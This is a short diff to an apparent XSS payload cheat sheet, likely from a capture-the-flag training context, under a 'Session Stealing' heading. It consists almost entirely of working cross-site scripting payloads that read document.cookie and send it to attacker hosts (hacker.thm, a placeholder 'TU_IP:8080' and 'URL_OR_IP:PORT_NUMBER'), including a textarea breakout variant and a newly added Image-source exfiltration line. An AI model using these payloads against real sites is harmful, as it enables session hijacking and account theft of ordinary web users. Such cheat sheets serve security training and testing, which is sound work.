@@ -8,6 +8,10 @@ ___
 ## Session Stealing
 <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
 
+<script>
+new Image().src='http://TU_IP:8080/steal?c='+document.cookie;
+</script>
+
 ### Blind TextArea cokie steal
 </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> 
 ___
